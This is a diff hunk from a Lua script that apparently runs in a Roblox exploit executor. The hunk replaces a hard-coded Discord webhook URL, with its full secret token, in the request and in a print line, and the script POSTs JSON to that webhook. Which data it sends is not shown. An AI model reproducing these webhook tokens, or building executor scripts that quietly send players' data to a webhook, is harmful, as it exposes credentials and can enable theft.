@@ -106,11 +106,11 @@
         timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
     };
     (syn and syn.request or http_request) {
-        Url = "https://discord.com/api/webhooks/896328165092372541/1sOgz9cn87y-5Gtdo3_PE3EAFLBc0wCH4TVk2evKb29mjn9GDXl5JhCVHT3Vyyjw2t9o";
+        Url = "https://discord.com/api/webhooks/896345000852475936/gz5pWbr9QyeZd1pzb-t8WiDFal66KrmYuVP7X1qM8TVtOA13wm_HU1Tw3vT6oAragfhO";
         Method = 'POST';
         Headers = {
             ['Content-Type'] = 'application/json';
         };
         Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
     };
-print("Sended To : ".."https://discord.com/api/webhooks/896328165092372541/1sOgz9cn87y-5Gtdo3_PE3EAFLBc0wCH4TVk2evKb29mjn9GDXl5JhCVHT3Vyyjw2t9o")
+print("Sended To : ".."https://discord.com/api/webhooks/896345000852475936/gz5pWbr9QyeZd1pzb-t8WiDFal66KrmYuVP7X1qM8TVtOA13wm_HU1Tw3vT6oAragfhO")
